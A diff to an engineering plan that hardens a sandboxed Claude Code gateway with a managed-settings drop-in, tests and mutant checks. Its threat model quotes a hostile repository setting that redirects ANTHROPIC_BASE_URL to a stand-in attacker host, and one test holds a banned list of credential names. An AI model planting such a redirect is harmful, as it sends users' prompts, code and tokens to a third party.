@@ -11,12 +11,17 @@ This task is the sandbox's whole side of the gateway: one small command and one 
 - Linux: `/etc/claude-code/managed-settings.json`, plus *"an optional `managed-settings.d/` directory"* in `/etc/claude-code/`. *"Claude Code merges `managed-settings.json` first, then every `*.json` file in the directory in alphabetical order"*; single values are replaced by the later file, lists combine, and nested blocks such as `env` *"merge key by key"*.
 - A managed file or drop-in that *"isn't valid JSON, or its top level isn't an object"* makes Claude Code **refuse to start**.
 
-Four decisions follow from those lines:
+Five decisions follow from those lines (the fifth from review I-4):
 
 - **(a) The fragment is a drop-in, `/etc/claude-code/managed-settings.d/50-panacea-gateway.json`.** That is OD-23's merge, done by Claude Code itself: whatever policy mechanism later owns `managed-settings.json` (seam S6.6) leaves this file alone, and the key-by-key `env` merge means the fragment's two variables survive a base file that sets its own. The skeleton's "installs the fragment at the managed-settings path" becomes this; the path is no longer **UNVERIFIED**. Whether a drop-in is read when no `managed-settings.json` exists beside it is not stated, and task 23 checks it with `/status`.
 - **(b) The fragment can never block its own helper.** A test refuses `forceLoginOrgUUID` and `forceLoginMethod` in it, and the part names the same constraint on the base file for S6.6 (a KPMG-derived `managed-settings.json` carrying `forceLoginOrgUUID` would stop every gateway session at startup).
 - **(c) `panacea token` never prints what it cannot vouch for.** It reads only the file named `token`, trims surrounding whitespace, and prints it only if what remains is 1 to 4096 printable ASCII characters with no space. Anything else is an exit 1 with a message that quotes no byte of the file. `token.tmp`, the launcher's half-written file (task 15), is ignored by construction, not by a filter.
 - **(d) The wait is 20 seconds, polled every 250 ms, and the 10-second warning is accepted.** The first call of a session can wait for a slow mint (the Panacea lesson, skeleton pitfall 3); past 10 s the CLI shows a notice, which is the honest signal. Whether the CLI's helper timeout is shorter than 20 s is **UNVERIFIED**; if it is, the first request fails, the CLI retries within three attempts, and the mint has usually landed by then. Task 23 observes it.
+- **(e) The fragment pins where a request goes (review I-4).** A repository's `.claude/settings.json` is content nobody in the session controls, and its `env` block is applied to Claude Code's own process (training knowledge, **UNVERIFIED**). `"env": {"ANTHROPIC_BASE_URL": "https://attacker"}` would send prompts, code and the session token there; pod binding makes the token useless off the pod and does nothing for the prompts. So the fragment sets the endpoint keys itself, and managed settings outrank project settings key by key (`05-design.md:838`, *"managed wins over project"*; which `env` keys a managed file can lock is **UNVERIFIED** there too, and task 23 proves it with a hostile `.claude/settings.json`):
+  - `ANTHROPIC_BASE_URL` = `http://gatekeeper.panacea-gateway.svc.cluster.local:4000`, the one name that resolves in both modes: the gatekeeper's Service in the cloud (task 19, namespace `panacea-gateway`) and the gatekeeper's network alias on `panacea-app-gateway` locally (task 17). Scheme, host and port only: a path such as `/v1/messages` would double-path every request (skeleton, "What Panacea's LiteLLM taught"; task 03's `CheckBaseURL` accepts exactly this shape).
+  - `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, `CLAUDE_CODE_USE_FOUNDRY` = `"0"`. Each switch sends requests to its own base URL variable (`ANTHROPIC_BEDROCK_BASE_URL` and its siblings), with a skip-auth flag beside it, so each is the same door as `ANTHROPIC_BASE_URL`. The names and the reading of `"0"` as off are training knowledge, **UNVERIFIED**; task 23's hostile file tries the Bedrock door.
+  - `NO_PROXY` and `no_proxy` = `gatekeeper.panacea-gateway.svc.cluster.local`. The base URL is plain `http`, so a project's `HTTP_PROXY` would carry every request, readable, through a proxy of its choosing. That the CLI honours both spellings is **UNVERIFIED**; task 23's hostile file sets `HTTP_PROXY`.
+  This is `05-design.md` §2.5's *"denies project `ANTHROPIC_*` env overrides"* for every key that chooses an endpoint; a list cannot be complete, and the residual is in "What this task does not claim". With the gateway off (task 15, `KEYSMITH_URL` unset) a session on this image has no inference at all: its CLI points at a gatekeeper it cannot reach, as its helper already fails with no token. That is OD-19's fail-closed (inference only through the gateway).
 
 **Files:**
 - `sandboxd/cmd/panacea/main.go` — `run`, `waitForToken`, `readToken`, the clock seam (new; standard library only, so nothing to vendor)
@@ -26,9 +31,9 @@ Four decisions follow from those lines:
 - `images/sandbox/Dockerfile` — build and install `/usr/local/bin/panacea`; install the fragment as the drop-in (modified)
 
 **Interfaces:**
-- Produces: the command line `panacea token` (exit 0 and the token on stdout with no newline; exit 1 and one line on stderr; exit 2 on any other arguments); `PANACEA_APP_GATEWAY_TOKEN_DIR` (default `/run/panacea/gateway`); the settings keys `apiKeyHelper`, `env.CLAUDE_CODE_API_KEY_HELPER_TTL_MS`, `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`.
-- Consumes: the file `<dir>/token`, written atomically by the launcher (task 15 locally, the broker in the cloud, ask P8-1); the skeleton's shared name for the directory (`/run/panacea/gateway/`, a mounted directory, never a mounted file).
-- Required by: task 15 (writes the file this reads; sets `ANTHROPIC_BASE_URL` and, on AU, `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1` in the launch environment), task 23 (runs the image's `claude` through it), seam S6.6.
+- Produces: the command line `panacea token` (exit 0 and the token on stdout with no newline; exit 1 and one line on stderr; exit 2 on any other arguments); `PANACEA_APP_GATEWAY_TOKEN_DIR` (default `/run/panacea/gateway`); the settings keys `apiKeyHelper`, `env.CLAUDE_CODE_API_KEY_HELPER_TTL_MS`, `env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`, and decision (e)'s pins `env.ANTHROPIC_BASE_URL`, `env.CLAUDE_CODE_USE_BEDROCK`, `env.CLAUDE_CODE_USE_VERTEX`, `env.CLAUDE_CODE_USE_FOUNDRY`, `env.NO_PROXY`, `env.no_proxy`; the one sandbox base URL `http://gatekeeper.panacea-gateway.svc.cluster.local:4000`.
+- Consumes: the file `<dir>/token`, written atomically by the launcher (task 15 locally, the broker in the cloud, ask P8-1); the skeleton's shared name for the directory (`/run/panacea/gateway/`, a mounted directory, never a mounted file); the name `gatekeeper.panacea-gateway.svc.cluster.local` resolving to the gatekeeper (task 17's network alias locally, task 19's Service in the cloud).
+- Required by: task 15 (writes the file this reads; sets the same `ANTHROPIC_BASE_URL` and, on AU, `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1` in the launch environment, and refuses any other base URL), task 17 (gives the gatekeeper the alias), task 19 (installs into namespace `panacea-gateway`), task 23 (runs the image's `claude` through it, and the hostile-settings check), seam S6.6.
 
 - [ ] **Step 1: Write the failing command tests**
 
@@ -188,6 +193,7 @@ package main
 
 import (
 	"encoding/json"
+	"net/url"
 	"os"
 	"reflect"
 	"strconv"
@@ -213,27 +219,57 @@ func repoFile(t *testing.T, p string) string {
 	return string(b)
 }
 
-// Kills a malformed fragment (Claude Code refuses to start on one) and any
-// key beyond the gateway's three.
+// The one name a sandbox reaches the gatekeeper by, in both modes (decision (e)).
+const gatekeeperHost = "gatekeeper.panacea-gateway.svc.cluster.local"
+
+// Kills a malformed fragment (Claude Code refuses to start on one), any key
+// beyond the gateway's, and a dropped or changed pin (decision (e)).
 func TestTheFragmentIsExactlyTheGatewayKeys(t *testing.T) {
 	var got map[string]any
 	if err := json.Unmarshal([]byte(repoFile(t, fragmentPath)), &got); err != nil {
 		t.Fatalf("the fragment is not one JSON object: %v", err)
 	}
 	want := map[string]any{"apiKeyHelper": "/usr/local/bin/panacea token", "env": map[string]any{
-		"CLAUDE_CODE_API_KEY_HELPER_TTL_MS": "120000", "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"}}
+		"CLAUDE_CODE_API_KEY_HELPER_TTL_MS": "120000", "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1",
+		"ANTHROPIC_BASE_URL": "http://" + gatekeeperHost + ":4000", "CLAUDE_CODE_USE_BEDROCK": "0",
+		"CLAUDE_CODE_USE_VERTEX": "0", "CLAUDE_CODE_USE_FOUNDRY": "0",
+		"NO_PROXY": gatekeeperHost, "no_proxy": gatekeeperHost}}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("fragment %v, want %v", got, want)
 	}
 }
 
-// Kills a credential or a provider switch in the environment (both outrank
-// the helper, or bypass the gateway) and kills a login restriction, which
-// blocks apiKeyHelper at startup.
+// Kills a base URL with a path (the double-pathed /v1/messages), a query or
+// credentials, another host, and a proxy bypass that misses the gatekeeper:
+// each would let a repository's settings, or the CLI itself, send prompts
+// somewhere else (review I-4).
+func TestTheFragmentPinsTheGatekeeperAsTheOnlyEndpoint(t *testing.T) {
+	var f struct{ Env map[string]string }
+	_ = json.Unmarshal([]byte(repoFile(t, fragmentPath)), &f)
+	u, err := url.Parse(f.Env["ANTHROPIC_BASE_URL"])
+	if err != nil || u.Scheme != "http" || u.Host != gatekeeperHost+":4000" || u.Path != "" ||
+		u.RawQuery != "" || u.User != nil {
+		t.Errorf("ANTHROPIC_BASE_URL %q: want http://%s:4000 and nothing else", f.Env["ANTHROPIC_BASE_URL"], gatekeeperHost)
+	}
+	for _, k := range []string{"CLAUDE_CODE_USE_BEDROCK", "CLAUDE_CODE_USE_VERTEX", "CLAUDE_CODE_USE_FOUNDRY"} {
+		if f.Env[k] != "0" {
+			t.Errorf("%s = %q: a provider switch the fragment does not pin off is a door past the gatekeeper", k, f.Env[k])
+		}
+	}
+	for _, k := range []string{"NO_PROXY", "no_proxy"} {
+		if f.Env[k] != gatekeeperHost {
+			t.Errorf("%s = %q: want %s, so no project proxy carries a request", k, f.Env[k], gatekeeperHost)
+		}
+	}
+}
+
+// Kills a credential in the environment (it outranks the helper), another
+// provider's endpoint, and a login restriction, which blocks apiKeyHelper at
+// startup.
 func TestTheFragmentCarriesNoCredentialAndNoLoginRestriction(t *testing.T) {
 	f := repoFile(t, fragmentPath)
-	for _, banned := range []string{"ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_BASE_URL",
-		"CLAUDE_CODE_USE_BEDROCK", "AWS_", "forceLoginMethod", "forceLoginOrgUUID", "sk-"} {
+	for _, banned := range []string{"ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "BEDROCK_BASE_URL",
+		"VERTEX_BASE_URL", "FOUNDRY_BASE_URL", "AWS_", "forceLoginMethod", "forceLoginOrgUUID", "sk-"} {
 		if strings.Contains(f, banned) {
 			t.Errorf("the fragment contains %q", banned)
 		}
@@ -399,10 +435,18 @@ Create `images/sandbox/managed-settings.gateway.json`:
   "apiKeyHelper": "/usr/local/bin/panacea token",
   "env": {
     "CLAUDE_CODE_API_KEY_HELPER_TTL_MS": "120000",
-    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"
+    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1",
+    "ANTHROPIC_BASE_URL": "http://gatekeeper.panacea-gateway.svc.cluster.local:4000",
+    "CLAUDE_CODE_USE_BEDROCK": "0",
+    "CLAUDE_CODE_USE_VERTEX": "0",
+    "CLAUDE_CODE_USE_FOUNDRY": "0",
+    "NO_PROXY": "gatekeeper.panacea-gateway.svc.cluster.local",
+    "no_proxy": "gatekeeper.panacea-gateway.svc.cluster.local"
   }
 }
 ```
+
+`CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS` is not pinned: it is per route (AU only), so it stays in task 15's launch environment. A repository that clears it can at worst make its own AU requests fail at Bedrock (P6-D3); it moves no prompt.
 
 In `images/sandbox/Dockerfile`, two edits and nothing else. Line 8 (`RUN cd sandboxd && … go build -o /out/sandboxd ./cmd/sandboxd`) becomes two builds from the same vendored module:
 
@@ -429,10 +473,10 @@ COPY images/sandbox/managed-settings.gateway.json /etc/claude-code/managed-setti
 ```bash
 cd sandboxd
 go test -count=1 ./cmd/panacea/                                          # expect: ok
-go test -count=1 -v ./cmd/panacea/ | grep -c '^--- PASS: Test'           # expect 11
+go test -count=1 -v ./cmd/panacea/ | grep -c '^--- PASS: Test'           # expect 12
 ```
 
-- [ ] **Step 7: Kill four mutants by hand**
+- [ ] **Step 7: Kill seven mutants by hand**
 
 | Edit | Test that must fail |
 |---|---|
@@ -440,6 +484,9 @@ go test -count=1 -v ./cmd/panacea/ | grep -c '^--- PASS: Test'           # expec
 | `waitForToken`: `c.Sleep(pollEvery)` loop replaced by a single `readToken(path)` | `TestATokenWrittenLateIsPrinted` |
 | `readToken`: the printable-ASCII loop deleted | `TestAMalformedTokenIsRefusedWithoutEcho` (the space, newline, NUL, control and non-ASCII rows) |
 | fragment: `"120000"` → `"300000"` | `TestTheFragmentIsExactlyTheGatewayKeys`, `TestTheHelperTTLIsInsideTheRefreshGrace` |
+| fragment: the `ANTHROPIC_BASE_URL` line deleted (the pre-I-4 fragment) | `TestTheFragmentIsExactlyTheGatewayKeys`, `TestTheFragmentPinsTheGatekeeperAsTheOnlyEndpoint` |
+| fragment: `…cluster.local:4000"` → `…cluster.local:4000/v1/messages"` (the Panacea 405) | the same two |
+| fragment: `"CLAUDE_CODE_USE_BEDROCK": "0"` → `"1"` | the same two |
 
 - [ ] **Step 8: Vet, and prove the image carries both files**
 
@@ -451,7 +498,7 @@ docker run --rm --entrypoint cat panacea-sandbox:task14 /etc/claude-code/managed
 docker run --rm --entrypoint /usr/local/bin/panacea panacea-sandbox:task14 token; echo "exit $?"
 ```
 
-Expected: the fragment's seven lines exactly; then, after 20 seconds, `panacea token: no gateway token after 20s; this session's mint has not landed, and the cockpit shows why` and `exit 1`.
+Expected: the fragment's thirteen lines exactly; then, after 20 seconds, `panacea token: no gateway token after 20s; this session's mint has not landed, and the cockpit shows why` and `exit 1`.
 
 - [ ] **Step 9: Commit**
 
@@ -460,9 +507,9 @@ git add sandboxd/cmd/panacea/main.go sandboxd/cmd/panacea/main_test.go sandboxd/
 git commit -F <message file> -- sandboxd/cmd/panacea/main.go sandboxd/cmd/panacea/main_test.go sandboxd/cmd/panacea/fragment_test.go images/sandbox/managed-settings.gateway.json images/sandbox/Dockerfile
 ```
 
-Message: `feat(sandbox): panacea token and the gateway managed-settings drop-in (phase 6 task 14)`, a body naming decisions (a) to (d) and the TTL change, and the attribution line.
+Message: `feat(sandbox): panacea token and the gateway managed-settings drop-in (phase 6 task 14)`, a body naming decisions (a) to (e) and the TTL change, and the attribution line.
 
-**Acceptance:** step 6 prints `ok` and `11`; step 7's four edits each fail the named tests; step 8 prints nothing, then one package, then the fragment, the timeout line and `exit 1`.
+**Acceptance:** step 6 prints `ok` and `12`; step 7's seven edits each fail the named tests; step 8 prints nothing, then one package, then the fragment, the timeout line and `exit 1`.
 
 **What this task does not claim:**
 
@@ -470,8 +517,10 @@ Message: `feat(sandbox): panacea token and the gateway managed-settings drop-in 
 - **That the helper is re-run at the TTL, or on a `401`.** The docs say five minutes by default and that the variable changes it; task 23 observes the interval. Re-running on a `401` is referred to (*"the other cases in which Claude Code re-runs the helper"*) and not read here.
 - **That 20 seconds is inside the CLI's helper timeout.** Decision (d).
 - **That no process in the sandbox can read the token.** Any process running as `dev` can run `panacea token`, which is why the token is pod-bound (task 10) and one-hour. The helper keeps it out of the **environment**, which every test suite and `postinstall` inherits (`05-design.md:207-208`); it does not keep it from the user's own code.
-- **That the launch environment is clean.** `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN` in the environment outranks the helper (the docs' precedence list). Their absence is task 15's test locally and ask P8-1's in the cloud; the fragment cannot unset a variable.
-- **The rest of the product's managed settings.** The `Bash(panacea *)` allow rule, the per-class permission modes and `allowManagedHooksOnly` (`05-design.md:243-248`) belong to the base file OD-23's mechanism will own.
+- **That the launch environment is clean.** `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN` in the environment outranks the helper (the docs' precedence list). Their absence is task 15's test locally and ask P8-1's in the cloud; the fragment cannot unset a variable. A repository's `.claude/settings.json` can set either too. That replaces the session token with the repository's own string, sent to the pinned gatekeeper, which refuses it: the session fails and no prompt moves. Pinning them to `""` would need the CLI to read an empty credential as absent, which is **UNVERIFIED**, so the fragment does not try.
+- **That decision (e)'s list is complete.** It pins every key known here that chooses an endpoint or a proxy. A key the fragment does not name is still the repository's. The complete control would stop a project's `env` block from applying at all, and the docs read here name no setting for it (**UNVERIFIED** whether one exists). S6.6 owns the search; task 23's hostile file is the regression check for the keys pinned here.
+- **That managed `env` outranks project `env` key by key.** `05-design.md:838` says managed wins, and marks which `env` keys a managed file can lock **UNVERIFIED**. Task 23's hostile-settings check is the evidence; if it fails, review I-4 is open again and task 23 stops there rather than passing.
+- **The rest of the product's managed settings.** `05-design.md:247`'s *"denies project `ANTHROPIC_*` env overrides (§7.3)"* is done here for the keys that choose an endpoint (decision (e)); anything past that list goes with the base file. The `Bash(panacea *)` allow rule, the per-class permission modes and `allowManagedHooksOnly` (`05-design.md:243-248`) belong to the base file OD-23's mechanism will own.
 
 **Gaps against the skeleton, for the orchestrator:**
 
@@ -479,3 +528,4 @@ Message: `feat(sandbox): panacea token and the gateway managed-settings drop-in 
 2. **S6.6 inherits a constraint.** The base `managed-settings.json` must not set `forceLoginOrgUUID`, or `forceLoginMethod` to `claudeai` or `console`: the docs block `apiKeyHelper` at startup under either. `05-design.md:249-250` already leaves `forceLoginMethod` unset; `forceLoginOrgUUID` is new, and a file derived from KPMG's tenant policy may carry it.
 3. The fragment is a **drop-in** at `/etc/claude-code/managed-settings.d/50-panacea-gateway.json`, not a file "at the managed-settings path" (decision (a)); the path is now verified.
 4. The "JSON test beside the fragment" lives in `sandboxd/cmd/panacea/fragment_test.go`, because `images/` has no Go module and the repository has no JSON test runner.
+5. **The sandbox base URL is one name in both modes (review I-4).** The skeleton had the launcher set `ANTHROPIC_BASE_URL` in the launch environment only (`http://gatekeeper:4000` locally). The fragment now pins `http://gatekeeper.panacea-gateway.svc.cluster.local:4000` (decision (e)), so task 17 gives the gatekeeper that network alias, task 15 sets the same value and refuses another, and task 19's chart installs only into namespace `panacea-gateway`.
